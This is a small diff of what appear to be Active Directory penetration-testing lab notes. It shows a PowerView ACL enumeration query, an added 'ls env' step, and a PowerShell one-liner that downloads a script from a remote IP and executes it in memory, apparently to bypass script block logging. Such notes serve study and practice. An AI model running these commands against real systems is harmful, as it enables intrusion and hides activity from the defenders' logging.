@@ -6,6 +6,10 @@
 >  Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 
 ```powershell
+ls env
+```
+
+```powershell
 iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb)
 ```
 
